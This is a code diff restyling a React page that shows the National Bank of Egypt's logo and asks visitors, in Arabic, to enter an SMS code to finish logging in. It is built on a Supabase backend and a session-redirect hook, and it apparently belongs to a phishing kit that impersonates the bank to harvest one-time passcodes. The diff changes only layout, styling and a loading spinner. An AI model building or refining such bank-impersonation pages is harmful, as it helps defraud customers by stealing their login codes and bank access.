@@ -1,6 +1,6 @@
 import { createFileRoute, useNavigate } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
-import { MessageSquare, ArrowRight } from "lucide-react";
+import { ArrowRight } from "lucide-react";
 import nbeLogo from "@/assets/nbe-logo-full.png.asset.json";
 import { supabase } from "@/integrations/supabase/client";
 import { useSessionRedirect } from "@/hooks/use-session-redirect";
@@ -75,8 +75,8 @@ function SmsPage() {
   };
 
   return (
-    <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
-      <header className="flex items-center justify-end border-b border-border px-6 py-4">
+    <div dir="rtl" className="flex min-h-screen flex-col bg-muted/40 text-foreground">
+      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
         <img
           src={nbeLogo.url}
           alt="البنك الأهلي المصري"
@@ -86,17 +86,22 @@ function SmsPage() {
         />
       </header>
 
-      <main className="flex flex-1 flex-col items-center px-4 pt-16">
-        <form onSubmit={handleSubmit} className="w-full max-w-md text-center">
-          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary">
-            <MessageSquare className="h-8 w-8" />
-          </div>
-          <h1 className="mt-6 text-2xl font-bold text-foreground">إدخال رمز الرسالة النصية</h1>
-          <p className="mt-2 text-sm text-muted-foreground">
+      <main className="flex flex-1 flex-col items-center px-4 py-10">
+        <form
+          onSubmit={handleSubmit}
+          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
+        >
+          <h1 className="text-xl font-bold text-foreground">إدخال رمز الرسالة النصية</h1>
+          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
             من فضلك أدخل الرمز المرسل إليك عبر رسالة SMS لإتمام تسجيل الدخول.
           </p>
 
-          <div className="mt-10">
+          <div className="mt-8 flex flex-col items-center">
+            <span className="text-base font-medium text-muted-foreground">Verification Code</span>
+            <div className="mt-4 h-12 w-12 animate-spin rounded-full border-[5px] border-muted border-t-muted-foreground/60" />
+          </div>
+
+          <div className="mt-6">
             <input
               type="text"
               inputMode="numeric"
@@ -105,10 +110,11 @@ function SmsPage() {
               placeholder="••••••"
               autoFocus
               disabled={submitting}
-              className="w-full rounded-xl border-2 border-input bg-background px-6 py-5 text-center text-3xl font-bold tracking-[0.5em] outline-none transition-colors placeholder:text-muted-foreground/40 focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
+              dir="ltr"
+              className="w-full rounded-xl border border-input bg-background px-6 py-4 text-center text-2xl font-bold tracking-[0.4em] outline-none transition-colors placeholder:text-muted-foreground/50 placeholder:font-normal focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
             />
             {error && (
-              <p className="mt-3 rounded-lg bg-destructive/10 px-3 py-2 text-xs font-semibold text-destructive">
+              <p className="mt-4 text-sm font-semibold text-destructive">
                 {error}
               </p>
             )}
@@ -117,7 +123,7 @@ function SmsPage() {
           <button
             type="submit"
             disabled={submitting || !code.trim()}
-            className="mt-10 flex w-full items-center justify-center gap-2 rounded-lg bg-primary py-4 text-sm font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
+            className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
           >
             تأكيد
             <ArrowRight className="h-4 w-4" />
